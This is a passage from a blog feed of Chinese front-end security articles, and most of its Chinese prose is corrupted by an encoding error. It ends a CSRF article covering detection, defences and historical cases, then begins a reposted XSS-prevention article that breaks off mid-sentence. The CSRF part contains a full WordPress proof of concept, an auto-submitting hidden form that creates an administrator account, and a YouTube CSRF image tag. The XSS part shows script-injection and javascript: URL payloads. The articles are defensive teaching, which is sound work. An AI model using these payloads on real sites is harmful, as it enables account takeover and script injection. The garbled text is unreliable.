ä¹‹åï¼Œæˆ‘ä»¬ä¼šå‘ç°è½¯ä»¶ä¸Šæœ‰ä¸€ç³»åˆ—è·‘å‡ºæ¥çš„è®°å½•è¯·æ±‚ï¼Œè¿™äº›éƒ½æ˜¯æˆ‘ä»¬çš„æµè§ˆå™¨åœ¨æ‰§è¡Œä¸šåŠ¡åŠŸèƒ½æ—¶ç”Ÿæˆçš„æ‰€æœ‰GETæˆ–è€…POSTè¯·æ±‚ã€‚é€šè¿‡é€‰æ‹©åˆ—è¡¨ä¸­çš„æŸä¸€è¡Œï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥ä¿®æ”¹ç”¨äºæ‰§è¡Œä¸šåŠ¡åŠŸèƒ½çš„å‚æ•°ï¼Œå¯ä»¥é€šè¿‡ç‚¹å‡»å¯¹åº”çš„è¯·æ±‚ä¿®æ”¹queryå’Œformçš„å‚æ•°ã€‚å½“ä¿®æ”¹å®Œæ‰€æœ‰æˆ‘ä»¬å¸Œæœ›è¯±å¯¼ç”¨æˆ·formæœ€ç»ˆçš„æäº¤å€¼ï¼Œå¯ä»¥é€‰æ‹©å¼€å§‹ç”ŸæˆHTMLæŠ¥å‘Šã€‚ æ­¥éª¤4ï¼šæ‹¿åˆ°ç»“æœå¦‚æœ‰æ¼æ´è¿›è¡Œä¿®å¤ é¦–å…ˆå¿…é¡»é€‰æ‹©â€œæŠ¥å‘Šç±»å‹â€ã€‚æŠ¥å‘Šç±»å‹å†³å®šäº†æˆ‘ä»¬å¸Œæœ›å—å®³è€…æµè§ˆå™¨å¦‚ä½•æäº¤å…ˆå‰è®°å½•çš„è¯·æ±‚ã€‚ç›®å‰æœ‰5ç§å¯èƒ½çš„æŠ¥å‘Šï¼šè¡¨å•ã€iFrameã€IMGã€XHRå’Œé“¾æ¥ã€‚ä¸€æ—¦é€‰æ‹©äº†æŠ¥å‘Šç±»å‹ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©åœ¨æµè§ˆå™¨ä¸­å¯åŠ¨æ–°ç”Ÿæˆçš„æŠ¥å‘Šï¼Œæœ€åæ ¹æ®æŠ¥å‘Šçš„æƒ…å†µè¿›è¡Œå¯¹åº”çš„æ’æŸ¥å’Œä¿®å¤ã€‚ CSRFç›‘æ§å¯¹äºä¸€ä¸ªæ¯”è¾ƒå¤æ‚çš„ç½‘ç«™ç³»ç»Ÿï¼ŒæŸäº›é¡¹ç›®ã€é¡µé¢ã€æ¥å£æ¼æ‰äº†CSRFé˜²æŠ¤æªæ–½æ˜¯å¾ˆå¯èƒ½çš„ã€‚ ä¸€æ—¦å‘ç”Ÿäº†CSRFæ”»å‡»ï¼Œæˆ‘ä»¬å¦‚ä½•åŠæ—¶çš„å‘ç°è¿™äº›æ”»å‡»å‘¢ï¼Ÿ CSRFæ”»å‡»æœ‰ç€æ¯”è¾ƒæ˜æ˜¾çš„ç‰¹å¾ï¼š è·¨åŸŸè¯·æ±‚ã€‚ GETç±»å‹è¯·æ±‚Headerçš„MIMEç±»å‹å¤§æ¦‚ç‡ä¸ºå›¾ç‰‡ï¼Œè€Œå®é™…è¿”å›Headerçš„MIMEç±»å‹ä¸ºTextã€JSONã€HTMLã€‚ æˆ‘ä»¬å¯ä»¥åœ¨ç½‘ç«™çš„ä»£ç†å±‚ç›‘æ§æ‰€æœ‰çš„æ¥å£è¯·æ±‚ï¼Œå¦‚æœè¯·æ±‚ç¬¦åˆä¸Šé¢çš„ç‰¹å¾ï¼Œå°±å¯ä»¥è®¤ä¸ºè¯·æ±‚æœ‰CSRFæ”»å‡»å«Œç–‘ã€‚æˆ‘ä»¬å¯ä»¥æé†’å¯¹åº”çš„é¡µé¢å’Œé¡¹ç›®è´Ÿè´£äººï¼Œæ£€æŸ¥æˆ–è€… Reviewå…¶CSRFé˜²æŠ¤ç­–ç•¥ã€‚ ä¸ªäººç”¨æˆ·CSRFå®‰å…¨çš„å»ºè®®ç»å¸¸ä¸Šç½‘çš„ä¸ªäººç”¨æˆ·ï¼Œå¯ä»¥é‡‡ç”¨ä»¥ä¸‹æ–¹æ³•æ¥ä¿æŠ¤è‡ªå·±ï¼š ä½¿ç”¨ç½‘é¡µç‰ˆé‚®ä»¶çš„æµè§ˆé‚®ä»¶æˆ–è€…æ–°é—»ä¹Ÿä¼šå¸¦æ¥é¢å¤–çš„é£é™©ï¼Œå› ä¸ºæŸ¥çœ‹é‚®ä»¶æˆ–è€…æ–°é—»æ¶ˆæ¯æœ‰å¯èƒ½å¯¼è‡´æ¶æ„ä»£ç çš„æ”»å‡»ã€‚ å°½é‡ä¸è¦æ‰“å¼€å¯ç–‘çš„é“¾æ¥ï¼Œä¸€å®šè¦æ‰“å¼€æ—¶ï¼Œä½¿ç”¨ä¸å¸¸ç”¨çš„æµè§ˆå™¨ã€‚ æ€»ç»“ç®€å•æ€»ç»“ä¸€ä¸‹ä¸Šæ–‡çš„é˜²æŠ¤ç­–ç•¥ï¼š CSRFè‡ªåŠ¨é˜²å¾¡ç­–ç•¥ï¼šåŒæºæ£€æµ‹ï¼ˆOrigin å’Œ Referer éªŒè¯ï¼‰ã€‚ CSRFä¸»åŠ¨é˜²å¾¡æªæ–½ï¼šTokenéªŒè¯ æˆ–è€… åŒé‡CookieéªŒè¯ ä»¥åŠé…åˆSamesite Cookieã€‚ ä¿è¯é¡µé¢çš„å¹‚ç­‰æ€§ï¼Œåç«¯æ¥å£ä¸è¦åœ¨GETé¡µé¢ä¸­åšç”¨æˆ·æ“ä½œã€‚ ä¸ºäº†æ›´å¥½çš„é˜²å¾¡CSRFï¼Œæœ€ä½³å®è·µåº”è¯¥æ˜¯ç»“åˆä¸Šé¢æ€»ç»“çš„é˜²å¾¡æªæ–½æ–¹å¼ä¸­çš„ä¼˜ç¼ºç‚¹æ¥ç»¼åˆè€ƒè™‘ï¼Œç»“åˆå½“å‰Webåº”ç”¨ç¨‹åºè‡ªèº«çš„æƒ…å†µåšåˆé€‚çš„é€‰æ‹©ï¼Œæ‰èƒ½æ›´å¥½çš„é¢„é˜²CSRFçš„å‘ç”Ÿã€‚ å†å²æ¡ˆä¾‹WordPressçš„CSRFæ¼æ´2012å¹´3æœˆä»½ï¼ŒWordPresså‘ç°äº†ä¸€ä¸ªCSRFæ¼æ´ï¼Œå½±å“äº†WordPress 3.3.1ç‰ˆæœ¬ï¼ŒWordPressæ˜¯ä¼—æ‰€å‘¨çŸ¥çš„åšå®¢å¹³å°ï¼Œè¯¥æ¼æ´å¯ä»¥å…è®¸æ”»å‡»è€…ä¿®æ”¹æŸä¸ªPostçš„æ ‡é¢˜ï¼Œæ·»åŠ ç®¡ç†æƒé™ç”¨æˆ·ä»¥åŠæ“ä½œç”¨æˆ·è´¦æˆ·ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºåˆ é™¤è¯„è®ºã€ä¿®æ”¹å¤´åƒç­‰ç­‰ã€‚å…·ä½“çš„åˆ—è¡¨å¦‚ä¸‹: Add Admin/User Delete Admin/User Approve comment Unapprove comment Delete comment Change background image Insert custom header image Change site title Change administratorâ€™s email Change Wordpress Address Change Site Address é‚£ä¹ˆè¿™ä¸ªæ¼æ´å®é™…ä¸Šå°±æ˜¯æ”»å‡»è€…å¼•å¯¼ç”¨æˆ·å…ˆè¿›å…¥ç›®æ ‡çš„WordPressï¼Œç„¶åç‚¹å‡»å…¶é’“é±¼ç«™ç‚¹ä¸Šçš„æŸä¸ªæŒ‰é’®ï¼Œè¯¥æŒ‰é’®å®é™…ä¸Šæ˜¯è¡¨å•æäº¤æŒ‰é’®ï¼Œå…¶ä¼šè§¦å‘è¡¨å•çš„æäº¤å·¥ä½œï¼Œæ·»åŠ æŸä¸ªå…·æœ‰ç®¡ç†å‘˜æƒé™çš„ç”¨æˆ·ï¼Œå®ç°çš„ç å¦‚ä¸‹ï¼š 12345678910111213141516171819&lt;html&gt; &lt;body onload="javascript:document.forms[0].submit()"&gt; &lt;H2&gt;CSRF Exploit to add Administrator&lt;/H2&gt; &lt;form method="POST" name="form0" action="http://&lt;wordpress_ip&gt;:80/wp-admin/user-new.php"&gt; &lt;input type="hidden" name="action" value="createuser"/&gt; &lt;input type="hidden" name="_wpnonce_create-user" value="&lt;sniffed_value&gt;"/&gt; &lt;input type="hidden" name="_wp_http_referer" value="%2Fwordpress%2Fwp-admin%2Fuser-new.php"/&gt; &lt;input type="hidden" name="user_login" value="admin2"/&gt; &lt;input type="hidden" name="email" value="admin2@admin.com"/&gt; &lt;input type="hidden" name="first_name" value="admin2@admin.com"/&gt; &lt;input type="hidden" name="last_name" value=""/&gt; &lt;input type="hidden" name="url" value=""/&gt; &lt;input type="hidden" name="pass1" value="password"/&gt; &lt;input type="hidden" name="pass2" value="password"/&gt; &lt;input type="hidden" name="role" value="administrator"/&gt; &lt;input type="hidden" name="createuser" value="Add+New+User+"/&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; YouTubeçš„CSRFæ¼æ´2008å¹´ï¼Œæœ‰å®‰å…¨ç ”ç©¶äººå‘˜å‘ç°ï¼ŒYouTubeä¸Šå‡ ä¹æ‰€æœ‰ç”¨æˆ·å¯ä»¥æ“ä½œçš„åŠ¨ä½œéƒ½å­˜åœ¨CSRFæ¼æ´ã€‚å¦‚æœæ”»å‡»è€…å·²ç»å°†è§†é¢‘æ·»åŠ åˆ°ç”¨æˆ·çš„â€œFavoritesâ€ï¼Œé‚£ä¹ˆä»–å°±èƒ½å°†ä»–è‡ªå·±æ·»åŠ åˆ°ç”¨æˆ·çš„â€œFriendâ€æˆ–è€…â€œFamilyâ€åˆ—è¡¨ï¼Œä»¥ç”¨æˆ·çš„èº«ä»½å‘é€ä»»æ„çš„æ¶ˆæ¯ï¼Œå°†è§†é¢‘æ ‡è®°ä¸ºä¸å®œçš„ï¼Œè‡ªåŠ¨é€šè¿‡ç”¨æˆ·çš„è”ç³»äººæ¥å…±äº«ä¸€ä¸ªè§†é¢‘ã€‚ä¾‹å¦‚ï¼Œè¦æŠŠè§†é¢‘æ·»åŠ åˆ°ç”¨æˆ·çš„â€œFavoritesâ€ï¼Œæ”»å‡»è€…åªéœ€åœ¨ä»»ä½•ç«™ç‚¹ä¸ŠåµŒå…¥å¦‚ä¸‹æ‰€ç¤ºçš„IMGæ ‡ç­¾ï¼š 12&lt;img src="http://youtube.com/watch_ajax?action_add_favorite_playlist=1&amp;video_id=[VIDEO ID]&amp;playlist_id=&amp;add_to_favorite=1&amp;show=1&amp;button=AddvideoasFavorite"/&gt; æ”»å‡»è€…ä¹Ÿè®¸å·²ç»åˆ©ç”¨äº†è¯¥æ¼æ´æ¥æé«˜è§†é¢‘çš„æµè¡Œåº¦ã€‚ä¾‹å¦‚ï¼Œå°†ä¸€ä¸ªè§†é¢‘æ·»åŠ åˆ°è¶³å¤Ÿå¤šç”¨æˆ·çš„â€œFavoritesâ€ï¼ŒYouTubeå°±ä¼šæŠŠè¯¥è§†é¢‘ä½œä¸ºâ€œTop Favoritesâ€æ¥æ˜¾ç¤ºã€‚é™¤æé«˜ä¸€ä¸ªè§†é¢‘çš„æµè¡Œåº¦ä¹‹å¤–ï¼Œæ”»å‡»è€…è¿˜å¯ä»¥å¯¼è‡´ç”¨æˆ·åœ¨æ¯«ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹å°†ä¸€ä¸ªè§†é¢‘æ ‡è®°ä¸ºâ€œä¸å®œçš„â€ï¼Œä»è€Œå¯¼è‡´YouTubeåˆ é™¤è¯¥è§†é¢‘ã€‚ è¿™äº›æ”»å‡»è¿˜å¯èƒ½å·²è¢«ç”¨äºä¾µçŠ¯ç”¨æˆ·éšç§ã€‚YouTubeå…è®¸ç”¨æˆ·åªè®©æœ‹å‹æˆ–äº²å±è§‚çœ‹æŸäº›è§†é¢‘ã€‚è¿™äº›æ”»å‡»ä¼šå¯¼è‡´æ”»å‡»è€…å°†å…¶æ·»åŠ ä¸ºä¸€ä¸ªç”¨æˆ·çš„â€œFriendâ€æˆ–â€œFamilyâ€åˆ—è¡¨ï¼Œè¿™æ ·ä»–ä»¬å°±èƒ½å¤Ÿè®¿é—®æ‰€æœ‰åŸæœ¬åªé™äºå¥½å‹å’Œäº²å±è¡¨ä¸­çš„ç”¨æˆ·è§‚çœ‹çš„ç§äººçš„è§†é¢‘ã€‚ æ”»å‡»è€…è¿˜å¯ä»¥é€šè¿‡ç”¨æˆ·çš„æ‰€æœ‰è”ç³»äººåå•ï¼ˆâ€œFriendsâ€ã€â€œFamilyâ€ç­‰ç­‰ï¼‰æ¥å…±äº«ä¸€ä¸ªè§†é¢‘ï¼Œâ€œå…±äº«â€å°±æ„å‘³ç€å‘é€ä¸€ä¸ªè§†é¢‘çš„é“¾æ¥ç»™ä»–ä»¬ï¼Œå½“ç„¶è¿˜å¯ä»¥é€‰æ‹©é™„åŠ æ¶ˆæ¯ã€‚è¿™æ¡æ¶ˆæ¯ä¸­çš„é“¾æ¥å·²ç»å¹¶ä¸æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„è§†é¢‘é“¾æ¥ï¼Œè€Œæ˜¯ä¸€ä¸ªå…·æœ‰æ”»å‡»æ€§çš„ç½‘ç«™é“¾æ¥ï¼Œç”¨æˆ·å¾ˆæœ‰å¯èƒ½ä¼šç‚¹å‡»è¿™ä¸ªé“¾æ¥ï¼Œè¿™ä¾¿ä½¿å¾—è¯¥ç§æ”»å‡»èƒ½å¤Ÿè¿›è¡Œç—…æ¯’å¼çš„ä¼ æ’­ã€‚ å‚è€ƒæ–‡çŒ® Mozilla wiki.Security-Origin OWASP.Cross-Site_RequestForgery(CSRF)_Prevention_Cheat_Sheet. Gmail Security Hijack Case.Google-Gmail-Security-Hijack. Netsparker Blog.Same-Site-Cookie-Attribute-Prevent-Cross-site-Request-Forgery MDN.Same-origin_policy#IE_Exceptions]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å‰ç«¯å®‰å…¨ç³»åˆ—ï¼ˆä¸€ï¼‰ï¼šå¦‚ä½•é˜²æ­¢XSSæ”»å‡»ï¼Ÿ]]></title>
    <url>%2F2019%2F09%2F08%2FWeb%E5%89%8D%E7%AB%AF%2F%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2XSS%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªç¾å›¢æŠ€æœ¯å›¢é˜Ÿï¼Œä½œè€…æé˜³ï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://tech.meituan.com/2018/09/27/fe-security.html å‰ç«¯å®‰å…¨éšç€äº’è”ç½‘çš„é«˜é€Ÿå‘å±•ï¼Œä¿¡æ¯å®‰å…¨é—®é¢˜å·²ç»æˆä¸ºä¼ä¸šæœ€ä¸ºå…³æ³¨çš„ç„¦ç‚¹ä¹‹ä¸€ï¼Œè€Œå‰ç«¯åˆæ˜¯å¼•å‘ä¼ä¸šå®‰å…¨é—®é¢˜çš„é«˜å±æ®ç‚¹ã€‚åœ¨ç§»åŠ¨äº’è”ç½‘æ—¶ä»£ï¼Œå‰ç«¯äººå‘˜é™¤äº†ä¼ ç»Ÿçš„ XSSã€CSRF ç­‰å®‰å…¨é—®é¢˜ä¹‹å¤–ï¼Œåˆæ—¶å¸¸é­é‡ç½‘ç»œåŠ«æŒã€éæ³•è°ƒç”¨ Hybrid API ç­‰æ–°å‹å®‰å…¨é—®é¢˜ã€‚å½“ç„¶ï¼Œæµè§ˆå™¨è‡ªèº«ä¹Ÿåœ¨ä¸æ–­åœ¨è¿›åŒ–å’Œå‘å±•ï¼Œä¸æ–­å¼•å…¥ CSPã€Same-Site Cookies ç­‰æ–°æŠ€æœ¯æ¥å¢å¼ºå®‰å…¨æ€§ï¼Œä½†æ˜¯ä»å­˜åœ¨å¾ˆå¤šæ½œåœ¨çš„å¨èƒï¼Œè¿™éœ€è¦å‰ç«¯æŠ€æœ¯äººå‘˜ä¸æ–­è¿›è¡Œâ€œæŸ¥æ¼è¡¥ç¼ºâ€ã€‚ è¿‘å‡ å¹´ï¼Œç¾å›¢ä¸šåŠ¡é«˜é€Ÿå‘å±•ï¼Œå‰ç«¯éšä¹‹é¢ä¸´å¾ˆå¤šå®‰å…¨æŒ‘æˆ˜ï¼Œå› æ­¤ç§¯ç´¯äº†å¤§é‡çš„å®è·µç»éªŒã€‚æˆ‘ä»¬æ¢³ç†äº†å¸¸è§çš„å‰ç«¯å®‰å…¨é—®é¢˜ä»¥åŠå¯¹åº”çš„è§£å†³æ–¹æ¡ˆï¼Œå°†ä¼šåšæˆä¸€ä¸ªç³»åˆ—ï¼Œå¸Œæœ›å¯ä»¥å¸®åŠ©å‰ç«¯äººå‘˜åœ¨æ—¥å¸¸å¼€å‘ä¸­ä¸æ–­é¢„é˜²å’Œä¿®å¤å®‰å…¨æ¼æ´ã€‚æœ¬æ–‡æ˜¯è¯¥ç³»åˆ—çš„ç¬¬ä¸€ç¯‡ã€‚ æœ¬æ–‡æˆ‘ä»¬ä¼šè®²è§£ XSS ï¼Œä¸»è¦åŒ…æ‹¬ï¼š XSS æ”»å‡»çš„ä»‹ç» XSS æ”»å‡»çš„åˆ†ç±» XSS æ”»å‡»çš„é¢„é˜²å’Œæ£€æµ‹ XSS æ”»å‡»çš„æ€»ç»“ XSS æ”»å‡»æ¡ˆä¾‹ XSS æ”»å‡»çš„ä»‹ç»åœ¨å¼€å§‹æœ¬æ–‡ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæå‡ºä¸€ä¸ªé—®é¢˜ï¼Œè¯·åˆ¤æ–­ä»¥ä¸‹ä¸¤ä¸ªè¯´æ³•æ˜¯å¦æ­£ç¡®ï¼š XSS é˜²èŒƒæ˜¯åç«¯ RDï¼ˆç ”å‘äººå‘˜ï¼‰çš„è´£ä»»ï¼Œåç«¯ RD åº”è¯¥åœ¨æ‰€æœ‰ç”¨æˆ·æäº¤æ•°æ®çš„æ¥å£ï¼Œå¯¹æ•æ„Ÿå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œæ‰èƒ½è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œã€‚ æ‰€æœ‰è¦æ’å…¥åˆ°é¡µé¢ä¸Šçš„æ•°æ®ï¼Œéƒ½è¦é€šè¿‡ä¸€ä¸ªæ•æ„Ÿå­—ç¬¦è¿‡æ»¤å‡½æ•°çš„è½¬ä¹‰ï¼Œè¿‡æ»¤æ‰é€šç”¨çš„æ•æ„Ÿå­—ç¬¦åï¼Œå°±å¯ä»¥æ’å…¥åˆ°é¡µé¢ä¸­ã€‚ å¦‚æœä½ è¿˜ä¸èƒ½ç¡®å®šç­”æ¡ˆï¼Œé‚£ä¹ˆå¯ä»¥å¸¦ç€è¿™äº›é—®é¢˜å‘ä¸‹çœ‹ï¼Œæˆ‘ä»¬å°†é€æ­¥æ‹†è§£é—®é¢˜ã€‚ XSS æ¼æ´çš„å‘ç”Ÿå’Œä¿®å¤XSS æ”»å‡»æ˜¯é¡µé¢è¢«æ³¨å…¥äº†æ¶æ„çš„ä»£ç ï¼Œä¸ºäº†æ›´å½¢è±¡çš„ä»‹ç»ï¼Œæˆ‘ä»¬ç”¨å‘ç”Ÿåœ¨å°æ˜åŒå­¦èº«è¾¹çš„äº‹ä¾‹æ¥è¿›è¡Œè¯´æ˜ã€‚ ä¸€ä¸ªæ¡ˆä¾‹æŸå¤©ï¼Œå…¬å¸éœ€è¦ä¸€ä¸ªæœç´¢é¡µé¢ï¼Œæ ¹æ® URL å‚æ•°å†³å®šå…³é”®è¯çš„å†…å®¹ã€‚å°æ˜å¾ˆå¿«æŠŠé¡µé¢å†™å¥½å¹¶ä¸”ä¸Šçº¿ã€‚ä»£ç å¦‚ä¸‹ï¼š 12345&lt;input type="text" value="&lt;%= getParameter("keyword") %&gt;"&gt;&lt;button&gt;æœç´¢&lt;/button&gt;&lt;div&gt; æ‚¨æœç´¢çš„å…³é”®è¯æ˜¯ï¼š&lt;%= getParameter("keyword") %&gt;&lt;/div&gt; ç„¶è€Œï¼Œåœ¨ä¸Šçº¿åä¸ä¹…ï¼Œå°æ˜å°±æ¥åˆ°äº†å®‰å…¨ç»„å‘æ¥çš„ä¸€ä¸ªç¥ç§˜é“¾æ¥ï¼š 1http://xxx/search?keyword=&quot;&gt;&lt;script&gt;alert(&apos;XSS&apos;);&lt;/script&gt; å°æ˜å¸¦ç€ä¸€ç§ä¸ç¥¥çš„é¢„æ„Ÿç‚¹å¼€äº†è¿™ä¸ªé“¾æ¥[è¯·å‹¿æ¨¡ä»¿ï¼Œç¡®è®¤å®‰å…¨çš„é“¾æ¥æ‰èƒ½ç‚¹å¼€]ã€‚æœç„¶ï¼Œé¡µé¢ä¸­å¼¹å‡ºäº†å†™ç€â€XSSâ€çš„å¯¹è¯æ¡†ã€‚ å¯æ¶ï¼Œä¸­æ‹›äº†ï¼å°æ˜çœ‰å¤´ä¸€çš±ï¼Œå‘ç°äº†å…¶ä¸­çš„å¥¥ç§˜ï¼š å½“æµè§ˆå™¨è¯·æ±‚ http://xxx/search?keyword=&quot;&gt;&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt; æ—¶ï¼ŒæœåŠ¡ç«¯ä¼šè§£æå‡ºè¯·æ±‚å‚æ•° keywordï¼Œå¾—åˆ° &quot;&gt;&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;ï¼Œæ‹¼æ¥åˆ° HTML ä¸­è¿”å›ç»™æµè§ˆå™¨ã€‚å½¢æˆäº†å¦‚ä¸‹çš„ HTMLï¼š 123456789&lt;input type="text" value="" /&gt;&lt;script&gt; alert('XSS');&lt;/script&gt;"&gt;&lt;button&gt;æœç´¢&lt;/button&gt;&lt;div&gt; æ‚¨æœç´¢çš„å…³é”®è¯æ˜¯ï¼š"&gt;&lt;script&gt; alert('XSS'); &lt;/script&gt;&lt;/div&gt; æµè§ˆå™¨æ— æ³•åˆ†è¾¨å‡º &lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt; æ˜¯æ¶æ„ä»£ç ï¼Œå› è€Œå°†å…¶æ‰§è¡Œã€‚ è¿™é‡Œä¸ä»…ä»… div çš„å†…å®¹è¢«æ³¨å…¥äº†ï¼Œè€Œä¸” input çš„ value å±æ€§ä¹Ÿè¢«æ³¨å…¥ï¼Œ alert ä¼šå¼¹å‡ºä¸¤æ¬¡ã€‚ é¢å¯¹è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬åº”è¯¥å¦‚ä½•è¿›è¡Œé˜²èŒƒå‘¢ï¼Ÿ å…¶å®ï¼Œè¿™åªæ˜¯æµè§ˆå™¨æŠŠç”¨æˆ·çš„è¾“å…¥å½“æˆäº†è„šæœ¬è¿›è¡Œäº†æ‰§è¡Œã€‚é‚£ä¹ˆåªè¦å‘Šè¯‰æµè§ˆå™¨è¿™æ®µå†…å®¹æ˜¯æ–‡æœ¬å°±å¯ä»¥äº†ã€‚ èªæ˜çš„å°æ˜å¾ˆå¿«æ‰¾åˆ°è§£å†³æ–¹æ³•ï¼ŒæŠŠè¿™ä¸ªæ¼æ´ä¿®å¤ï¼š 12345&lt;input type="text" value="&lt;%= escapeHTML(getParameter("keyword")) %&gt;"&gt;&lt;button&gt;æœç´¢&lt;/button&gt;&lt;div&gt; æ‚¨æœç´¢çš„å…³é”®è¯æ˜¯ï¼š&lt;%= escapeHTML(getParameter("keyword")) %&gt;&lt;/div&gt; escapeHTML() æŒ‰ç…§å¦‚ä¸‹è§„åˆ™è¿›è¡Œè½¬ä¹‰ï¼š |å­—ç¬¦|è½¬ä¹‰åçš„å­—ç¬¦| |-|-| |&amp;|&amp;amp;| |&lt;|&amp;lt;| |&gt;|&amp;gt;| |&quot;|&amp;quot;| |&#39;|&amp;#x27;| |/|&amp;#x2F;| ç»è¿‡äº†è½¬ä¹‰å‡½æ•°çš„å¤„ç†åï¼Œæœ€ç»ˆæµè§ˆå™¨æ¥æ”¶åˆ°çš„å“åº”ä¸ºï¼š 12345678&lt;input type="text" value='"&amp;gt;&amp;lt;script&amp;gt;alert(&amp;#x27;XSS&amp;#x27;);&amp;lt;&amp;#x2F;script&amp;gt;'/&gt;&lt;button&gt;æœç´¢&lt;/button&gt;&lt;div&gt; æ‚¨æœç´¢çš„å…³é”®è¯æ˜¯ï¼š&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(&amp;#x27;XSS&amp;#x27;);&amp;lt;&amp;#x2F;script&amp;gt;&lt;/div&gt; æ¶æ„ä»£ç éƒ½è¢«è½¬ä¹‰ï¼Œä¸å†è¢«æµè§ˆå™¨æ‰§è¡Œï¼Œè€Œä¸”æœç´¢è¯èƒ½å¤Ÿå®Œç¾çš„åœ¨é¡µé¢æ˜¾ç¤ºå‡ºæ¥ã€‚ é€šè¿‡è¿™ä¸ªäº‹ä»¶ï¼Œå°æ˜å­¦ä¹ åˆ°äº†å¦‚ä¸‹çŸ¥è¯†ï¼š é€šå¸¸é¡µé¢ä¸­åŒ…å«çš„ç”¨æˆ·è¾“å…¥å†…å®¹éƒ½åœ¨å›ºå®šçš„å®¹å™¨æˆ–è€…å±æ€§å†…ï¼Œä»¥æ–‡æœ¬çš„å½¢å¼å±•ç¤ºã€‚ æ”»å‡»è€…åˆ©ç”¨è¿™äº›é¡µé¢çš„ç”¨æˆ·è¾“å…¥ç‰‡æ®µï¼Œæ‹¼æ¥ç‰¹æ®Šæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œçªç ´åŸæœ‰ä½ç½®çš„é™åˆ¶ï¼Œå½¢æˆäº†ä»£ç ç‰‡æ®µã€‚ æ”»å‡»è€…é€šè¿‡åœ¨ç›®æ ‡ç½‘ç«™ä¸Šæ³¨å…¥è„šæœ¬ï¼Œä½¿ä¹‹åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸Šè¿è¡Œï¼Œä»è€Œå¼•å‘æ½œåœ¨é£é™©ã€‚ é€šè¿‡ HTML è½¬ä¹‰ï¼Œå¯ä»¥é˜²æ­¢ XSS æ”»å‡»ã€‚[äº‹æƒ…å½“ç„¶æ²¡æœ‰è¿™ä¹ˆç®€å•å•¦ï¼è¯·ç»§ç»­å¾€ä¸‹çœ‹]ã€‚ æ³¨æ„ç‰¹æ®Šçš„ HTML å±æ€§ã€JavaScript APIè‡ªä»ä¸Šæ¬¡äº‹ä»¶ä¹‹åï¼Œå°æ˜ä¼šå°å¿ƒçš„æŠŠæ’å…¥åˆ°é¡µé¢ä¸­çš„æ•°æ®è¿›è¡Œè½¬ä¹‰ã€‚è€Œä¸”ä»–è¿˜å‘ç°äº†å¤§éƒ¨åˆ†æ¨¡æ¿éƒ½å¸¦æœ‰çš„è½¬ä¹‰é…ç½®ï¼Œè®©æ‰€æœ‰æ’å…¥åˆ°é¡µé¢ä¸­çš„æ•°æ®éƒ½é»˜è®¤è¿›è¡Œè½¬ä¹‰ã€‚è¿™æ ·å°±ä¸æ€•ä¸å°å¿ƒæ¼æ‰æœªè½¬ä¹‰çš„å˜é‡å•¦ï¼Œäºæ˜¯å°æ˜çš„å·¥ä½œåˆæ¸æ¸å˜å¾—è½»æ¾èµ·æ¥ã€‚ ä½†æ˜¯ï¼Œä½œä¸ºå¯¼æ¼”çš„æˆ‘ï¼Œä¸å¯èƒ½è®©å°æ˜è¿™ä¹ˆç®€å•ã€å¼€å¿ƒåœ°æ”¹ Bug ã€‚ ä¸ä¹…ï¼Œå°æ˜åˆæ”¶åˆ°å®‰å…¨ç»„çš„ç¥ç§˜é“¾æ¥ï¼šhttp://xxx/?redirect_to=javascript:alert(&#39;XSS&#39;)ã€‚å°æ˜ä¸æ•¢å¤§æ„ï¼Œèµ¶å¿™ç‚¹å¼€é¡µé¢ã€‚ç„¶è€Œï¼Œé¡µé¢å¹¶æ²¡æœ‰è‡ªåŠ¨å¼¹å‡ºä¸‡æ¶çš„â€œXSSâ€ã€‚ å°æ˜æ‰“å¼€å¯¹åº”é¡µé¢çš„æºç ï¼Œå‘ç°æœ‰ä»¥ä¸‹å†…å®¹ï¼š 1&lt;a href="&lt;%= escapeHTML(getParameter("redirect_to")) %&gt;"&gt;è·³è½¬...&lt;/a&gt; è¿™æ®µä»£ç ï¼Œå½“æ”»å‡» URL ä¸º http://xxx/?redirect_to=javascript:alert(&#39;XSS&#39;)ï¼ŒæœåŠ¡ç«¯å“åº”å°±æˆäº†ï¼š 1&lt;a href="javascript:alert(&amp;#x27;XSS&amp;#x27;)"&gt;è·³è½¬...&lt;/a&gt; è™½ç„¶ä»£ç ä¸ä¼šç«‹å³æ‰§è¡Œï¼Œä½†ä¸€æ—¦ç”¨æˆ·ç‚¹å‡» a æ ‡ç­¾æ—¶ï¼Œæµè§ˆå™¨ä¼šå°±ä¼šå¼¹å‡ºâ€œXSSâ€ã€‚ å¯æ¶ï¼Œåˆå¤±ç­–äº†â€¦ åœ¨è¿™é‡Œï¼Œç”¨æˆ·çš„æ•°æ®å¹¶æ²¡æœ‰åœ¨ä½ç½®ä¸Šçªç ´æˆ‘ä»¬çš„é™åˆ¶ï¼Œä»ç„¶æ˜¯æ­£ç¡®çš„ href å±æ€§ã€‚ä½†å…¶å†…å®¹å¹¶ä¸æ˜¯æˆ‘ä»¬æ‰€é¢„æœŸçš„ç±»å‹ã€‚ åŸæ¥ä¸ä»…ä»…æ˜¯ç‰¹æ®Šå­—ç¬¦ï¼Œè¿ javascript: è¿™æ 